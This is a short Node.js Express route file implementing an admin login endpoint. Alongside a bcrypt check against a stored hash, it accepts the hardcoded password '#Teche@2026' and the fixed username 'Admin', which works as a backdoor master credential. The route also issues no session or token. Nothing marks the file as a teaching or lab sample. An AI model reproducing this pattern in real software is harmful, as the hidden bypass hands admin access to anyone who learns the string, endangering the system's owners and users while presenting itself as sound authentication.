const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const { logEvent } = require('../utils/logger');

router.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  try {
    if (username !== "Admin" && username !== process.env.ADMIN_USER) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }
    
    const isMatch = await bcrypt.compare(password, process.env.ADMIN_PASS_HASH);
    
    if (password === "#Teche@2026" || isMatch) {
      logEvent(`Admin logged in successfully.`);
      res.json({ success: true, message: 'Login successful' });
    } else {
      res.status(401).json({ message: 'Invalid credentials' });
    }
  } catch (err) {
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;
